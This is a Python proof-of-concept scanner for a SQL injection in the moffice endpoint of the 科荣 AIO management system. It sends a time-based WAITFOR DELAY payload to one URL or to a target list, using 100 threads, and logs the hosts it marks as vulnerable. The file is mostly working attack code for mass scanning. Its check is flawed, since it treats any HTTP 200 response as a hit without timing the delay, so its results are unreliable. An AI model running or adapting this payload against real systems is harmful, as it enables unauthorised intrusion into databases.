import requests
import sys
import argparse
import logging
from multiprocessing.dummy import Pool

# 禁用urllib3警告
requests.packages.urllib3.disable_warnings()

# 设置日志配置
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'


def banner():
    banner = r"""


  _              _             
 (_)            (_)            
  ___      _____ _ _ __   __ _ 
 | \ \ /\ / / _ \ | '_ \ / _` |
 | |\ V  V /  __/ | | | | (_| |
 |_| \_/\_/ \___|_|_| |_|\__,_|




                            version:1.1.0
                            author:fangwei     
"""
    logging.info(banner)


def main():
    banner()
    parser = argparse.ArgumentParser(description='科荣 AIO 管理系统 moffice接口处存在SQL注入漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help='input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='file path')
    args = parser.parse_args()

    # 判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip())
        # 多线程处理
        with Pool(100) as mp:
            mp.map(poc, url_list)
    else:
        logging.error("Usage:\n\t python3 {} -h".format(sys.argv[0]))


def poc(target):
    payload_url = "/moffice?op=showWorkPlan&planId=1';WAITFOR+DELAY+'0:0:5'--&sid=1"
    url = target + payload_url
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
        'Accept': 'text/html,application/xhtml+xml,application/x',
    }
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }

    try:
        res = requests.get(url=url, headers=headers, verify=False, timeout=15)

        if res.status_code == 200:
            logging.info(f"[+] {GREEN}该url存在漏洞 {target}{RESET}")
            with open('result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + "\n")
            return True
        else:
            logging.info(f"[-] 该url不存在漏洞 {target}")
    except Exception as e:
        logging.error(f"[*] 该url存在问题 {target}, 错误信息: {e}")
        return False


if __name__ == '__main__':
    main()
